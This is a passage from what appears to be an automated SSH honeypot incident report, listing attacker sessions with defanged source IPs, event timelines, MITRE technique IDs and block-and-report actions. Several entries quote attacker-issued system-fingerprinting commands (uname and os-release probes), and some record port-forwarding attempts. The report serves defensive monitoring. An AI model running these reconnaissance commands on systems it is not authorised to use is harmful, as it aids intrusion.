| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:45:05` | `cowrie.session.connect` |
| `2026-09-03 11:45:05` | `cowrie.client.version` |
| `2026-09-03 11:45:05` | `cowrie.client.kex` |
| `2026-09-03 11:45:05` | `cowrie.login.success` |
| `2026-09-03 11:45:06` | `cowrie.session.params` |
| `2026-09-03 11:45:06` | `cowrie.command.input` |
| `2026-09-03 11:45:06` | `cowrie.command.input` |
| `2026-09-03 11:45:06` | `cowrie.command.input` |
| `2026-09-03 11:45:06` | `cowrie.command.input` |
| `2026-09-03 11:45:06` | `cowrie.command.input` |
| `2026-09-03 11:45:06` | `cowrie.command.success` |
| `2026-09-03 11:45:06` | `cowrie.command.input` |
| `2026-09-03 11:45:06` | `cowrie.command.input` |
| `2026-09-03 11:45:06` | `cowrie.command.input` |
| `2026-09-03 11:45:06` | `cowrie.command.input` |
| `2026-09-03 11:45:06` | `cowrie.log.closed` |
| `2026-09-03 11:45:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6512203de489

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 11:45 |
| **Last Seen** | 2026-09-03 11:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:45:34` | `cowrie.session.connect` |
| `2026-09-03 11:45:34` | `cowrie.client.version` |
| `2026-09-03 11:45:34` | `cowrie.client.kex` |
| `2026-09-03 11:45:35` | `cowrie.login.success` |
| `2026-09-03 11:45:36` | `cowrie.session.params` |
| `2026-09-03 11:45:36` | `cowrie.command.input` |
| `2026-09-03 11:45:36` | `cowrie.log.closed` |
| `2026-09-03 11:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ec7e2e76e58

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:46 |
| **Last Seen** | 2026-09-03 11:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:46:32` | `cowrie.session.connect` |
| `2026-09-03 11:46:32` | `cowrie.client.version` |
| `2026-09-03 11:46:33` | `cowrie.client.kex` |
| `2026-09-03 11:46:33` | `cowrie.login.success` |
| `2026-09-03 11:46:34` | `cowrie.session.params` |
| `2026-09-03 11:46:34` | `cowrie.command.input` |
| `2026-09-03 11:46:34` | `cowrie.command.input` |
| `2026-09-03 11:46:34` | `cowrie.command.input` |
| `2026-09-03 11:46:34` | `cowrie.command.input` |
| `2026-09-03 11:46:34` | `cowrie.command.input` |
| `2026-09-03 11:46:34` | `cowrie.command.success` |
| `2026-09-03 11:46:34` | `cowrie.command.input` |
| `2026-09-03 11:46:34` | `cowrie.command.input` |
| `2026-09-03 11:46:34` | `cowrie.command.input` |
| `2026-09-03 11:46:34` | `cowrie.command.input` |
| `2026-09-03 11:46:34` | `cowrie.log.closed` |
| `2026-09-03 11:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a59672bba09

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 11:47 |
| **Last Seen** | 2026-09-03 11:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:47:08` | `cowrie.session.connect` |
| `2026-09-03 11:47:08` | `cowrie.client.version` |
| `2026-09-03 11:47:08` | `cowrie.client.kex` |
| `2026-09-03 11:47:08` | `cowrie.login.success` |
| `2026-09-03 11:47:09` | `cowrie.session.params` |
| `2026-09-03 11:47:09` | `cowrie.command.input` |
| `2026-09-03 11:47:09` | `cowrie.log.closed` |
| `2026-09-03 11:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f98b70ca7147

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:48 |
| **Last Seen** | 2026-09-03 11:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:48:04` | `cowrie.session.connect` |
| `2026-09-03 11:48:04` | `cowrie.client.version` |
| `2026-09-03 11:48:04` | `cowrie.client.kex` |
| `2026-09-03 11:48:05` | `cowrie.login.success` |
| `2026-09-03 11:48:06` | `cowrie.session.params` |
| `2026-09-03 11:48:06` | `cowrie.command.input` |
| `2026-09-03 11:48:06` | `cowrie.command.input` |
| `2026-09-03 11:48:06` | `cowrie.command.input` |
| `2026-09-03 11:48:06` | `cowrie.command.input` |
| `2026-09-03 11:48:06` | `cowrie.command.input` |
| `2026-09-03 11:48:06` | `cowrie.command.success` |
| `2026-09-03 11:48:06` | `cowrie.command.input` |
| `2026-09-03 11:48:06` | `cowrie.command.input` |
| `2026-09-03 11:48:06` | `cowrie.command.input` |
| `2026-09-03 11:48:06` | `cowrie.command.input` |
| `2026-09-03 11:48:06` | `cowrie.log.closed` |
| `2026-09-03 11:48:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59fe2ae2a1cb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 11:48 |
| **Last Seen** | 2026-09-03 11:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:48:44` | `cowrie.session.connect` |
| `2026-09-03 11:48:44` | `cowrie.client.version` |
| `2026-09-03 11:48:45` | `cowrie.client.kex` |
| `2026-09-03 11:48:45` | `cowrie.login.success` |
| `2026-09-03 11:48:46` | `cowrie.session.params` |
| `2026-09-03 11:48:46` | `cowrie.command.input` |
| `2026-09-03 11:48:46` | `cowrie.log.closed` |
| `2026-09-03 11:48:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f51566f2e01

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:49 |
| **Last Seen** | 2026-09-03 11:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:49:16` | `cowrie.session.connect` |
| `2026-09-03 11:49:16` | `cowrie.client.version` |
| `2026-09-03 11:49:16` | `cowrie.client.kex` |
| `2026-09-03 11:49:17` | `cowrie.login.success` |
| `2026-09-03 11:49:18` | `cowrie.session.params` |
| `2026-09-03 11:49:18` | `cowrie.command.input` |
| `2026-09-03 11:49:18` | `cowrie.command.input` |
| `2026-09-03 11:49:18` | `cowrie.command.input` |
| `2026-09-03 11:49:18` | `cowrie.command.input` |
| `2026-09-03 11:49:18` | `cowrie.command.input` |
| `2026-09-03 11:49:18` | `cowrie.command.success` |
| `2026-09-03 11:49:18` | `cowrie.command.input` |
| `2026-09-03 11:49:18` | `cowrie.command.input` |
| `2026-09-03 11:49:18` | `cowrie.command.input` |
| `2026-09-03 11:49:18` | `cowrie.command.input` |
| `2026-09-03 11:49:18` | `cowrie.log.closed` |
| `2026-09-03 11:49:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e5cc708b8a7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 11:50 |
| **Last Seen** | 2026-09-03 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:50:19` | `cowrie.session.connect` |
| `2026-09-03 11:50:19` | `cowrie.client.version` |
| `2026-09-03 11:50:19` | `cowrie.client.kex` |
| `2026-09-03 11:50:20` | `cowrie.login.success` |
| `2026-09-03 11:50:21` | `cowrie.session.params` |
| `2026-09-03 11:50:21` | `cowrie.command.input` |
| `2026-09-03 11:50:21` | `cowrie.log.closed` |
| `2026-09-03 11:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcec09b5b82e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 11:51 |
| **Last Seen** | 2026-09-03 11:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:51:06` | `cowrie.session.connect` |
| `2026-09-03 11:51:06` | `cowrie.client.version` |
| `2026-09-03 11:51:06` | `cowrie.client.kex` |
| `2026-09-03 11:51:08` | `cowrie.login.success` |
| `2026-09-03 11:51:08` | `cowrie.direct-tcpip.request` |
| `2026-09-03 11:51:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 11:51:08` | `cowrie.direct-tcpip.data` |
| `2026-09-03 11:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14f34e40a447

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 11:51 |
| **Last Seen** | 2026-09-03 11:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:51:23` | `cowrie.session.connect` |
| `2026-09-03 11:51:23` | `cowrie.client.version` |
| `2026-09-03 11:51:23` | `cowrie.client.kex` |
| `2026-09-03 11:51:25` | `cowrie.login.success` |
| `2026-09-03 11:51:25` | `cowrie.direct-tcpip.request` |
| `2026-09-03 11:51:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 11:51:25` | `cowrie.direct-tcpip.data` |
| `2026-09-03 11:51:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-256413bd2a34

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 11:51 |
| **Last Seen** | 2026-09-03 11:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:51:51` | `cowrie.session.connect` |
| `2026-09-03 11:51:51` | `cowrie.client.version` |
| `2026-09-03 11:51:51` | `cowrie.client.kex` |
| `2026-09-03 11:51:51` | `cowrie.login.success` |
| `2026-09-03 11:51:52` | `cowrie.session.params` |
| `2026-09-03 11:51:52` | `cowrie.command.input` |
| `2026-09-03 11:51:52` | `cowrie.log.closed` |
| `2026-09-03 11:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcad27c96acb

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:53 |
| **Last Seen** | 2026-09-03 11:53 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:53:20` | `cowrie.session.connect` |
| `2026-09-03 11:53:26` | `cowrie.login.success` |
| `2026-09-03 11:53:26` | `cowrie.session.params` |
| `2026-09-03 11:53:31` | `cowrie.log.closed` |
| `2026-09-03 11:53:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3fbcf5fe683

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:53 |
| **Last Seen** | 2026-09-03 11:53 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:53:20` | `cowrie.session.connect` |
| `2026-09-03 11:53:26` | `cowrie.login.success` |
| `2026-09-03 11:53:27` | `cowrie.session.params` |
| `2026-09-03 11:53:31` | `cowrie.log.closed` |
| `2026-09-03 11:53:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0eff67d56cc

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 11:53 |
| **Last Seen** | 2026-09-03 11:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:53:23` | `cowrie.session.connect` |
| `2026-09-03 11:53:23` | `cowrie.client.version` |
| `2026-09-03 11:53:24` | `cowrie.client.kex` |
| `2026-09-03 11:53:24` | `cowrie.login.success` |
| `2026-09-03 11:53:25` | `cowrie.session.params` |
| `2026-09-03 11:53:25` | `cowrie.command.input` |
| `2026-09-03 11:53:25` | `cowrie.log.closed` |
| `2026-09-03 11:53:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fbca22847e4

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:53 |
| **Last Seen** | 2026-09-03 11:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:53:31` | `cowrie.session.connect` |
| `2026-09-03 11:53:31` | `cowrie.login.success` |
| `2026-09-03 11:53:31` | `cowrie.session.params` |
| `2026-09-03 11:53:36` | `cowrie.log.closed` |
| `2026-09-03 11:53:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24655a67e05f

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:53 |
| **Last Seen** | 2026-09-03 11:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:53:31` | `cowrie.session.connect` |
| `2026-09-03 11:53:31` | `cowrie.login.success` |
| `2026-09-03 11:53:32` | `cowrie.session.params` |
| `2026-09-03 11:53:36` | `cowrie.log.closed` |
| `2026-09-03 11:53:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-434a84af1ad5

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:53 |
| **Last Seen** | 2026-09-03 11:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:53:36` | `cowrie.session.connect` |
| `2026-09-03 11:53:36` | `cowrie.login.success` |
| `2026-09-03 11:53:36` | `cowrie.session.params` |
| `2026-09-03 11:53:41` | `cowrie.log.closed` |
| `2026-09-03 11:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f70022b7494

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:53 |
| **Last Seen** | 2026-09-03 11:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:53:36` | `cowrie.session.connect` |
| `2026-09-03 11:53:36` | `cowrie.login.success` |
| `2026-09-03 11:53:37` | `cowrie.session.params` |
| `2026-09-03 11:53:41` | `cowrie.log.closed` |
| `2026-09-03 11:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef004a79cbd6

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:53 |
| **Last Seen** | 2026-09-03 11:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:53:37` | `cowrie.session.connect` |
| `2026-09-03 11:53:37` | `cowrie.login.success` |
| `2026-09-03 11:53:38` | `cowrie.session.params` |
| `2026-09-03 11:53:41` | `cowrie.log.closed` |
| `2026-09-03 11:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13802ecd5591

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:53 |
| **Last Seen** | 2026-09-03 11:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:53:41` | `cowrie.session.connect` |
| `2026-09-03 11:53:41` | `cowrie.login.success` |
| `2026-09-03 11:53:41` | `cowrie.session.params` |
| `2026-09-03 11:53:46` | `cowrie.log.closed` |
| `2026-09-03 11:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de234755301c

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:53 |
| **Last Seen** | 2026-09-03 11:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:53:41` | `cowrie.session.connect` |
| `2026-09-03 11:53:41` | `cowrie.login.success` |
| `2026-09-03 11:53:42` | `cowrie.session.params` |
| `2026-09-03 11:53:46` | `cowrie.log.closed` |
| `2026-09-03 11:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1665565daea6

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:53 |
| **Last Seen** | 2026-09-03 11:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:53:42` | `cowrie.session.connect` |
| `2026-09-03 11:53:42` | `cowrie.login.success` |
| `2026-09-03 11:53:43` | `cowrie.session.params` |
| `2026-09-03 11:53:46` | `cowrie.log.closed` |
| `2026-09-03 11:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f0b77242e2f

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:53 |
| **Last Seen** | 2026-09-03 11:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:53:46` | `cowrie.session.connect` |
| `2026-09-03 11:53:46` | `cowrie.login.success` |
| `2026-09-03 11:53:46` | `cowrie.session.params` |
| `2026-09-03 11:53:51` | `cowrie.log.closed` |
| `2026-09-03 11:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-698ec5d0266d

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:53 |
| **Last Seen** | 2026-09-03 11:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:53:46` | `cowrie.session.connect` |
| `2026-09-03 11:53:46` | `cowrie.login.success` |
| `2026-09-03 11:53:47` | `cowrie.session.params` |
| `2026-09-03 11:53:51` | `cowrie.log.closed` |
| `2026-09-03 11:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
- [ ] Block `45.33.50[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fc89cb0f4bc

| Field | Detail |
|---|---|
| **Source IP** | `45.33.50[.]24` |
| **First Seen** | 2026-09-03 11:54 |
| **Last Seen** | 2026-09-03 11:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:54:29` | `cowrie.session.connect` |
| `2026-09-03 11:54:29` | `cowrie.login.success` |
| `2026-09-03 11:54:30` | `cowrie.session.params` |
| `2026-09-03 11:54:34` | `cowrie.log.closed` |
| `2026-09-03 11:54:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.50[.]24` to AbuseIPDB if not already reported
